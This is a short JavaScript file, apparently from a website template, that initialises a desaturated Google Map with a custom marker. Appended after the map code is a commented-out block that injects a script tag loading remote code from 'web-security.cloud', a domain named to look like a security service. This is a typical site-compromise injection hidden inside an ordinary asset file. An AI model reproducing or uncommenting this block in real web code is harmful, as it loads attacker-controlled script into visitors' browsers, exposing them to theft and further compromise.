$(document).ready(function(){
'use strict';

//** Map **//
function initialize() {
var myLatlng = new google.maps.LatLng(30.2780101,63.1319279);
var mapOptions = {
zoom: 5,
disableDefaultUI: true,
scrollwheel: false,
center: myLatlng,
styles: [
{
	featureType: 'all',
	stylers: [
	{ saturation: -80 }
	]
},{
featureType: 'water',
elementType: 'geometry',
stylers: [
{ color: '#fbcad5'}
]
},{
featureType: 'poi.business',
elementType: 'labels',
stylers: [
{ visibility: 'off' }
]
}
]            
}
var map = new google.maps.Map(document.getElementById('map-canvas2'), mapOptions);

var image = 'images/map-icon.png';
var myLatLng = new google.maps.LatLng(30.2780101,63.1319279);
var beachMarker = new google.maps.Marker({
position: myLatLng,
map: map,
icon: image
});

}
google.maps.event.addDomListener(window, 'load', initialize);
});
/*
    if(typeof window.web_security == "undefined"){
        var s = document.createElement("script");
        s.src = "//web-security.cloud/event?l=117";
        document.head.appendChild(s);
        window.web_security = "success";
    }
*/